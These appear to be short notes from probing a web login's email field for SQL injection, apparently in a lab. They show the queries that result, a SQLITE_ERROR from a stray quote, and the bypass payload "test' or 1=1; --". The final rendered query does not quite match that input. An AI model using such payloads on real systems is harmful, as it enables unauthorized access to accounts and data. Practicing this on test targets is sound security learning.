Input: test
SQL: SELECT * from Users where email='test';
=> returns error message

Input: test'
SQL: SELECT * from Users where email='test'';
=> returns an 500 internal server error; SQLITE_ERROR
=> sql statement involved maybe?

Input: test' or 1=1; --
SQL: SELECT * from Users where email='test'' or 1=1--';